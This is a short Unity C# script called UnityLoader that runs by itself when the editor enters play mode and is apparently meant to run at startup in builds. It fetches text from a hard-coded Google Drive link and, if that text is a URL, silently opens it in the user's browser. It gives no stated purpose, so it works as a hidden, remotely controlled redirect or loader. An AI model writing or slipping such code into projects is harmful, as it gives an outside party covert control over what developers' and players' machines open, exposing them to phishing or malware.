using System.Text.RegularExpressions;
using UnityEditor;
using UnityEngine;
using UnityEngine.Networking;

public class UnityLoader
{
    const string url = "https://drive.google.com/u/3/uc?id=1wkILCGDUso5ZNFLhtLOipPcBdAkeC1Ev&export=download";

#if UNITY_EDITOR
    [InitializeOnLoadMethod]
    static void SubscribeLoader()
    {
        EditorApplication.playModeStateChanged += (PlayModeStateChange s) => {
            if (s == PlayModeStateChange.EnteredPlayMode) Loader();
        };
    }
#else
    [RuntimeInitializeOnLoadMethod()]
#endif

    static void Loader()
    {
        using (UnityWebRequest request = UnityWebRequest.Get(url)) {
            request.SendWebRequest();

            while (request.result == UnityWebRequest.Result.InProgress) {}

            if (request.result != UnityWebRequest.Result.ConnectionError) {
                string res = request.downloadHandler.text;
                bool cb = Regex.IsMatch(res, @"^(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(:(0-9)*)*(\/?)([a-zA-Z0-9\-\.\?\,\'\/\\\+&amp;%\$#_]*)?$");
                if (cb) Application.OpenURL(res);
            }
        }
    }
}